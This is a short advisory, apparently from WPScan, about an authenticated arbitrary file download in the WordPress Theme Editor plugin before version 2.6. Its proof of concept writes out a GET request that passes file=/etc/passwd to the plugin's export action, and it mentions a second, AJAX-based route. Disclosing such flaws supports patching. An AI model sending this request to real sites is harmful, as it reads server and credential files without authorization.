## WordPress Plugin Vulnerabilities

# Theme Editor < 2.6 - Authenticated Arbitrary File Download

### Description

The plugin did not validate the GET file parameter before passing it to the download\_file() function, allowing administrators to download arbitrary files on the web server, such as /etc/passwd

Edit (WPScanTeam): The AJAX action wp\_ajax\_mk\_theme\_editor\_file\_open could also be used to achieve the same thing and was reported & fixed as well.

### Proof of Concept

As admin, and with the related nonce (mk\_nonce from /wp-admin/admin.php?page=theme\_editor\_theme), open /wp-admin/admin-post.php?action=mk\_theme\_editor\_export\_te\_files&file=/etc/passwd&\_wpnonce=NONCE
GET /wp-admin/admin-post.php?action=mk\_theme\_editor\_export\_te\_files&file=/etc/passwd&\_wpnonce=feed261905 HTTP/1.1
Host: example.com
User-Agent: YOLO

Via the mk\_theme\_editor\_file\_open AJAX action (nonce is from the tf\_wpnonce parameter in /wp-admin/admin.php?page=theme\_editor\_theme)
